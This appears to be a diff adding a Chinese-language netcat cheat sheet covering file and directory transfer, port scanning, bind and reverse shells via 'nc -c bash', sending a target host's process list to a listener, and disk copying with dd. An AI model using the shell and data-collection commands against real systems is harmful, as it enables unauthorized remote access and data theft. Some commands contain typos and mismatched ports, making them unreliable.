@@ -1,0 +1,82 @@
+NC传输文件:
+接收A: nc -lp 4444 > upload.exe  #开始侦听 将数据 重定向 upload.exe
+发送B: nc -nv 192.168.0.100 4444 < upload.exe -q 1   #将文件发送到侦听端
+
+
+
+
+
+端口扫描:
+nc -nvz 192.179.1.4 1-100
+#nc 用来进行端口扫描的命令是
+# nc -nvz ip地址 端口号
+-z 参数翻译过来就是不进行 i/o，用来扫描,意思就是仅仅是去ping去探测目标是否开启指定端口，不进行任何的交互。
+-v 参数就是列出执行过程的详细信息，n 参数翻译过来就是只接收 ip 地址，没有 dns。
+-n 参数是因为使用命令的过程中只去传入 ip，减少了 nc 把域名解析为 ip 的过程，这样可以节省时间提高效率。
+
+建立连接 侦听模式和传输模式: 传输文本信息:
+A: nc -lp 4444  # -l监听模式  -p端口
+B: nc 192.168.1.14 #连接到主机A的地址
+#######
+A: nc -l -p port   #监听指定端口号
+B: nc -nv ip port  #连接对方的TCP端口
+
+NC 远程控制:
+#//正向连接，主机A 将自己的 bash 发送给 主机B
+A: nc -l -p 4444 -c bash   ( bash /bin/sh )
+B: nc 192.168.1.4 4444
+
+#//反向连接, B 将自己的 bash 发送给 A  win下换成 cmd
+A: nc -lp port
+B: nc 192.168.1.4 port -c bash
+
+收集目标主机上的进程信息:
+A: nc -l -p 4444 > data.txt   #将远程发过来的内容保存到本地文件
+B: ps aux | nc -nv 192.168.0.100 4444 -q 1   #标准输入完成后 延迟1秒钟，发送到侦听端
+#主机A 开启监听 并将接收的数据 重定向到 data.txt文件
+#主机B 查询进程信息 通过管道命令符|  将数据传输给 主机A
+
+NC传输文件:
+A: nc -lp 4444 > upload.exe  #开始侦听 将数据 重定向 upload.exe
+B: nc -nv 192.168.0.100 4444 < upload.exe -q 1   #将文件发送到侦听端
+
+NC传输目录:
+A: tar -cvf - dir/ | nc -lp 444 -q 1   #将目录打包 发送到侦听端
+B: nc -nv 192.168.0.100 4444 | tar -xvf -   #将目录解压 
+
+NC流媒体服务:
+A: cat wing.mp4 | nc -lp 444
+B: nc -nv 192.168.0.100 4444 | medaer-player -vo x11 -cache 4000
+#//A让wing.mp4这个文件将流的形式发送到B，B用me-player播放 收到多少播放多少 最多缓存4000 bytes
+
+NC复制磁盘:
+A: nc -lp 444 | dd of=/dev/sda
+B: dd if=/dev/sda | nc -nc 192.168.0.100 4444 -q 1
+if 真 input filter
+of 真 output filter
+#//B将数据复制到A挂载的硬盘上
+
+#其实常用的就几个参数-n,-v,-l,-p,-q
+-c    shell commands shell模式
+-e    filename 程序重定向 [危险!!]
+-b    允许广播
+-d    无命令行界面,使用后台模式
+-g    gateway 源路由跳跃点, 不超过8
+-G    num 源路由指示器 4, 8, 12, ...
+-h    获取帮助信息
+-i    secs 延时设置,端口扫描时使用
+-k    设置在socket上的存活选项
+-l    监听入站信息
+-n    以数字形式表示的IP地址
+-o    file 使进制记录
+-p    port 本地端口
+-r    随机本地和远程的端口
+-q    secs 在标准输入且延迟后退出（翻译的不是很好，后面实例介绍）
+-s    addr 本地源地址
+-T    tos 设置服务类型
+-t    以TELNET的形式应答入站请求
+-u    UDP模式
+-v    显示详细信息 [使用=vv获取更详细的信息
+-w    secs 连接超时设置
+-z    I/O 模式 [扫描时使用]
+
